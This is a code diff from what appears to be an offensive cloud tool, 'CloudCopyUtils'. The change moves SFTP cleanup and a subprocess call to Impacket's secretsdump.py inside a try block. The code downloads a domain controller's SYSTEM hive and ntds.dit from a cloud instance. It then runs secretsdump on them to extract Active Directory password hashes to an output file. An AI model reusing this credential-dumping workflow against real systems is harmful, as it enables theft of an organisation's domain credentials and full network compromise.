@@ -288,13 +288,13 @@ class CloudCopyUtils:
             print("SYSTEM registry hive file retrieval complete")
             sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit-" + outfileUid)
             print("ntds.dit registry hive file retrieval complete")
-        except Exception:
+            sftp.close()
+            connection.close()
+            self.printGap()
+            print("finally gonna run secretsdump!")
+            import subprocess
+            subprocess.run(
+                ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid, "local",
+                 "-outputfile", "secrets-" + outfileUid])
+        except Exception as e:
             print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
-        sftp.close()
-        connection.close()
-        self.printGap()
-        print("finally gonna run secretsdump!")
-        import subprocess
-        subprocess.run(
-            ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid, "local",
-             "-outputfile", "secrets-" + outfileUid])
